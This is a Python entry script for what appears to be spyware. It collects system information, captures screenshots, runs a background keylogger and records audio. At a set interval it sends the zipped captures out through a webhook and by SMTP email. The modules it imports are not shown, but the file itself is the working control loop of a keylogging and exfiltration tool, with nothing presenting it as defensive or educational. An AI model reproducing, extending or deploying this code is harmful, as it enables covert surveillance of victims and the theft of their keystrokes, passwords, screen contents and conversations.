import time
import threading
import smtp_mail
import cfg
from systeminfo import SystemInformation
from keylogger import Keylogger
from screenshot import Screenshot
from recorder import AudioRecorder
from webhook_filesender import FileSender


def main():
    """Log system information"""
    SystemInformation().log_systeminfo()

    """Take Screenshot"""
    screenshot = Screenshot()
    if cfg.ENABLE_SCREENSHOT:
        screenshot.capture()

    """Start Key Logging"""
    keylogger = Keylogger()
    keylogger_thread = threading.Thread(target=keylogger.start_listener)
    keylogger_thread.daemon = True  # Allow the thread to exit when the program exits
    keylogger_thread.start()

    """Start Audio Recording - Save recordings every [RECORDING_TIME] duration"""
    recorder = AudioRecorder()
    if cfg.ENABLE_RECORDING:
        recorder.start_recording()

    """Webhook FileSender"""
    webhook_file_sender = FileSender()

    last_saved = time.time()
    try:
        while True:
            current_time = time.time()
            if current_time - last_saved >= cfg.TRANSMISSION_INTERVAL:
                keylogger.write2file()  # Save keylog to file
                if cfg.ENABLE_WEBHOOK:
                    webhook_file_sender.execute()  # Send .zip files(systeminfo, screenshot, keylog, audio) to webhook

                if cfg.ENABLE_SMTP_TRANSFER:
                    smtp_mail.smtp_mail_it()

                """Prepare for the next phase"""
                if cfg.ENABLE_SCREENSHOT:
                    screenshot.capture()
                last_saved = current_time

            time.sleep(1)
    except KeyboardInterrupt:
        recorder.is_recording = False
        print("Application is stopped.")


if __name__ == '__main__':
    main()
